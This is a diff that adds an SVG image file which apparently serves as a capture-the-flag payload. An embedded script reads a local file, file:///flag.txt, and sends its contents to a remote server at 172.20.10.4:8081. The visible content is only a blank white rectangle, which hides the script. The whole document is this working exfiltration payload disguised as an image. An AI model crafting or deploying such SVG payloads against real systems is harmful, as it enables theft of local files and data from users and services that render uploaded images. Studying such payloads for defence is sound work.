@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script type="text/javascript">
+    fetch('file:///flag.txt')
+      .then(response => response.text())
+      .then(data => {
+        // Send the flag to our server
+        fetch('http://172.20.10.4:8081/flag?data=' + encodeURIComponent(data));
+      });
+  </script>
+  <rect width="100" height="100" fill="white"/>
+</svg> 
